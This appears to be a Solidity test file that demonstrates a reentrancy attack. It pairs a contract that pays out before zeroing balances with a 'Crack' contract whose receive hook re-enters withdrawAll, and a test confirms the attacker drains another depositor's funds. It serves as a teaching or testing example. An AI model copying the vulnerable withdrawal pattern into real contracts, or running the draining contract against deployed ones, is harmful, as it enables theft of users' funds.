// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.8;

import "ds-test/test.sol";

contract Reentrancy {

    mapping (address => uint) balances;

    error NoValue(address account);
    error TransferFailed(address account, uint value);

    function deposit() payable public {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        uint value = balances[msg.sender];
        if (value == 0) revert NoValue(msg.sender);

        (bool success, bytes memory data) = msg.sender.call{value: value}("");
        if (!success || (data.length != 0 && !abi.decode(data, (bool)))) revert TransferFailed(msg.sender, value);

        balances[msg.sender] = 0;
    }

}

contract Crack {
    Reentrancy reentrancy;

    receive() payable external {
        try reentrancy.withdrawAll() {}
        catch {}
    }

    constructor(Reentrancy _reentrancy) {
        reentrancy = _reentrancy;
    }

    function crack() payable public {
        reentrancy.deposit{value: msg.value}();
        reentrancy.withdrawAll();
    }
}

contract ReentrancyTest is DSTest {
    Reentrancy reentrancy;
    Crack crack;

    receive() payable external {}

    function setUp() public {
        reentrancy = new Reentrancy();
        crack = new Crack(reentrancy);
    }

    function testWithdrawAll() public {
        uint start = address(this).balance;
        reentrancy.deposit{value: 20}();
        assertEq(address(this).balance, start - 20);
        reentrancy.withdrawAll();
    }

    function testcrack() public {
        reentrancy.deposit{value: 100}();
        crack.crack{value: 20}();
        assertEq(address(crack).balance, 120);
    }

}
